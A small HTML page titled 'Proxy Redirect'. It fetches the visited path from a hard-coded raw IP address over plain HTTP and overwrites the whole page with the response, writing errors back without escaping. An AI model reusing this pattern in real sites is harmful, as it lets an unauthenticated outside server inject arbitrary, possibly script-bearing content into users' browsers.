<!DOCTYPE html>
<html>
<head>
    <title>Proxy Redirect</title>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const path = window.location.pathname.substring(1); // Remove leading '/'
            if (path) {
                const proxyUrl = `http://194.36.171.20:8000/${path}`;
                
                fetch(proxyUrl)
                    .then(response => response.text())
                    .then(data => {
                        document.documentElement.innerHTML = data;
                    })
                    .catch(error => {
                        document.body.innerHTML = `<pre>${error}</pre>`;
                    });
            } else {
                document.body.innerHTML = '<h1>No path provided</h1>';
            }
        });
    </script>
</head>
<body>
    <h1>Loading...</h1>
</body>
</html>
